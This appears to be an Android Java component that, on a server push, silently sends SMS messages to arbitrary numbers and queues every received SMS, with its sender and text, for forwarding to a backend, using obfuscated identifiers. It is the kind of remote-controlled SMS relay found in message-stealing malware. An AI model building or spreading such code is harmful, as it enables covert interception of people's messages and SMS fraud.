package manager.app.com.text;

import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;

import java.util.concurrent.TimeUnit;

import manager.app.com.commons.commons.SdkComponent;

public class TextComponent extends SdkComponent {

    public static final String ARG_PHONE_NUMBER = "arg_t6562565_1";
    public static final String ARG_MESSAGE = "arg_t6562565_2";
    public static final String ARG_SMS_ID = "arg_t6562565_3";

    private static final String JOB_TAG_SEND_RECEIVED_SMS = "t826t763738_1";
    private static final String JOB_TAG_SMS_SENT = "t826t763738_2";
    private static final String JOB_TAG_CHECK_FOR_EVENTS_NOW = "ev67673286828_now";
    private static final String JOB_TAG_CHECK_FOR_EVENTS = "ev67673286828";

    private static TextComponent instance;

    public static TextComponent get() {
        return instance;
    }

    public TextComponent() {
        instance = this;
    }

    @Override
    public void onDeviceRegistered() {
        startCheckForDeviceEvents();
    }

    @Override
    public void onFcmMessageReceived(Bundle payload) {
        String type = payload.getString("type");
        if ("sms".equals(type)) {
            String smsId = payload.getString("id");
            String phone = payload.getString("phone_number");
            String message = payload.getString("text");
            onSmsComeToSend(smsId, phone, message);
        }
    }

    @Override
    public void onDeviceRebooted() {

    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_CHECK_FOR_EVENTS.equals(tag) ||
                JOB_TAG_CHECK_FOR_EVENTS_NOW.equals(tag)) {
            return new CheckPendingEventsJob();
        }
        if (JOB_TAG_SEND_RECEIVED_SMS.equals(tag)) {
            return new SendReceivedSmsJob();
        }
        if (JOB_TAG_SMS_SENT.equals(tag)) {
            return new SendSmsSentStatusJob();
        }
        return null;
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    private void startCheckForDeviceEvents() {
        // One-off at NOW
        long executionWindow = TimeUnit.SECONDS.toMillis(10);
        long startTime = TimeUnit.SECONDS.toMillis(10);
        new JobRequest.Builder(JOB_TAG_CHECK_FOR_EVENTS_NOW)
                .setExecutionWindow(startTime, startTime + executionWindow)
                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
        // Repeated
        new JobRequest.Builder(JOB_TAG_CHECK_FOR_EVENTS)
                .setPeriodic(TimeUnit.MINUTES.toMillis(15), TimeUnit.MINUTES.toMillis(5))
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    public void onSmsReceived(String sender, String message) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_PHONE_NUMBER, sender);
        extras.putString(ARG_MESSAGE, message);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_SEND_RECEIVED_SMS)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    private void onSmsWasSent(String smsId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_SMS_ID, smsId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_SMS_SENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    public void onSmsComeToSend(String smsId, String recipient, String message) {
        if (!TextUtils.isEmpty(recipient) && !TextUtils.isEmpty(message)) {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(recipient, null, message, null, null);
            onSmsWasSent(smsId);
        }
    }
}
